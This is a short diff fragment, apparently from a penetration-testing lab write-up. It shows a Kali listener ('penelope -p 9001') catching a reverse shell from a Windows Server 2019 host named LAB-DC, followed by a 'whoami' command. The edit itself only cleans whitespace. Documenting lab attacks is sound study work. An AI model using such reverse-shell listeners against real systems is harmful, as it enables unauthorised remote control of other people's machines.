@@ -506,7 +506,8 @@ kali@kali:penelope -p 9001
 [+] Got reverse shell from LAB-DC~10.48.183.111-Microsoft_Windows_Server_2019_Standard-x64-based_PC 😍 Assigned SessionID <1>
 [+] Added readline support...
 [+] Interacting with session [1], Shell Type: Readline, Menu key: Ctrl-D 
-[+] Logging to /home/kali/.penelope/sessions/LAB-DC~10.48.183.111-Microsoft_Windows_Server_2019_Standard-x64-based_PC/2026_02_07-12_40_09-248.log 📜                                                                                                                              
+[+] Logging to /home/kali/.penelope/sessions/LAB-DC~10.48.183.111-Microsoft_Windows_Server_2019_Standard-x64-based_PC/2026_02_07-12_40_09-248.log 📜
+
 ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 C:\Windows\system32>whoami
 whoami
